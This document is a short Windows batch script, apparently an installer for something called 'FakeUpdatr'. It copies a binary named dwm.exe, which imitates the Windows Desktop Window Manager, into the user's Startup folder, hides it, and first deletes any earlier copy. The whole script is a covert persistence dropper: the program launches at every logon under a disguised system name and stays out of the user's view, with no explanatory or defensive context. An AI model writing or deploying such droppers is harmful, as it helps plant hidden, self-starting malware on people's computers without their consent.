@echo off
echo Installing FakeUpdatr...
attrib -h -s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\dwm.exe"&del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\dwm.exe"
copy /y dwm.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\dwm.exe"
attrib +h "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\dwm.exe"
echo Finished!